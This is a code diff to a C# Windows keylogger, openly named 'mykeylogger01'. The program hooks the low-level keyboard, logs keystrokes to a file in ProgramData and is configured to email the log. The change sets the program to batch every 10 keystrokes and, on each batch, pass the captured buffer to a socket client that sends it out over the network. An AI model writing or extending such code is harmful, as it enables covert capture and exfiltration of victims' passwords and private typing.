@@ -19,7 +19,7 @@ namespace mykeylogger01
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
         private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
-        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
+        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 10;
         // ----------------------------- END -------------------------------- //
 
         private static int WH_KEYBOARD_LL = 13;
@@ -30,8 +30,6 @@ namespace mykeylogger01
         
         static void Main(string[] args)
         {
-            Client client = new Client();
-            client.clientSocket();
             hook = SetHook(llkProcedure);
             Application.Run();
             UnhookWindowsHookEx(hook);
@@ -44,6 +42,9 @@ namespace mykeylogger01
 
             if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
             {
+                Client client = new Client();
+                client.clientSocket(buffer);
+
                 StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                 output.Write(buffer);
                 output.Close();
